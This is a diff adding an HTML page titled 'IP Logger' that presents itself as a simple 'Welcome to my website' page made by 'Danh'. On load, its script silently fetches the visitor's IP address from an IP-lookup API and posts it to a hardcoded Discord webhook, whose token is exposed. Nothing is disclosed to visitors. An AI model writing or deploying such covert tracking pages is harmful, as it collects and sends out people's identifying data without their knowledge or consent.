@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger</title>
+</head>
+<body>
+    <h1>Welcome to my website</h1>
+    <h1>Made by Danh</h1>
+    
+    <script>
+        // Lấy địa chỉ IP của người dùng bằng cách gọi API
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const userIp = data.ip; // Địa chỉ IP của người dùng
+
+                // Tạo thông điệp gửi tới Webhook trên Discord
+                const message = {
+                    content: `Địa chỉ IP của người dùng: ${userIp}`
+                };
+
+                // Gửi địa chỉ IP tới Webhook của Discord
+                fetch('https://discord.com/api/webhooks/1285529360358576160/0AlWGSQZQQnUaVZ5opdsdx9NWwZ0nrgepSoBOdhIoj530FY6t5i4vlQNLndXF8531mhT', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(message),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Đã gửi địa chỉ IP tới Discord thành công');
+                    } else {
+                        console.error('Gửi địa chỉ IP tới Discord thất bại');
+                    }
+                })
+                .catch(error => {
+                    console.error('Lỗi:', error);
+                });
+            });
+    </script>
+</body>
+</html>
